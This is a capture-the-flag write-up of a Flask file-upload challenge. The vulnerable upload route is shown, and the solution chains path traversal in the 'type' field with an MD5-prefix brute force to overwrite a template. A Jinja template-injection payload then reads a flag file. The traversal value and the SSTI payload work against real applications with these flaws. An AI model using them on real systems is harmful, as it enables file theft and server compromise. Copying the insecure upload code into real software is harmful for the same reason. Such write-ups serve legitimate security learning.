
# Create a custom template and overwrite an existing one

> This server had so many pitfalls (public secret key, debug mode and comments directing at non important methods)

The important magic happens in these two routes:

```python
@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        flash('You, uh, kinda need a file.')
        return redirect(url_for('index'))
    if 'type' not in request.form:
        flash('Please specify a filetype.')
        return redirect(url_for('index'))
    file = request.files['file']
    UPLOAD_FOLDER = './wall/' + request.form['type']
    if file.filename == '':
        flash('You uh, kinda need a file.')
        return redirect(url_for('index'))
    if file:
        filename = hashlib.md5(file.read()).hexdigest()[:5] + '.' + '.'.join(file.filename.split('.')[1:])
        file.seek(0)
        try:
            file.save(os.path.join(UPLOAD_FOLDER, filename))
            flash('File successfully uploaded!')
            return redirect(url_for('index'))
        except:
            flash('Error while uploading file.')
            return redirect(url_for('index'))
```

```python
@app.route('/decaf')
def mutton():
    return render_template('decaf.html')
```

## Observations

1. We can change the parameter `type` to influence the the location to save the file
2. We can influence the file type
3. The filename is always a hash consisting of the digits `0123456789abcdef`
4. There is a template called `decaf` which is **rendered** by flask :D 

## Execution

> We craft a payload that has a hex md5 starting with `decaf`. We do so by placing random values into the template (here we put in a different title).

[Jinja template payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

We now send the following payload with the filename `png.html` and the type `../wall/../../app/templates/`

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>gryHJFEMnz</title>
</head>
<body>
    {{ get_flashed_messages.__globals__.__builtins__.open("../var/flag").read() }}
</body>
</html>
```

Accessing `/decaf` gifts us the flag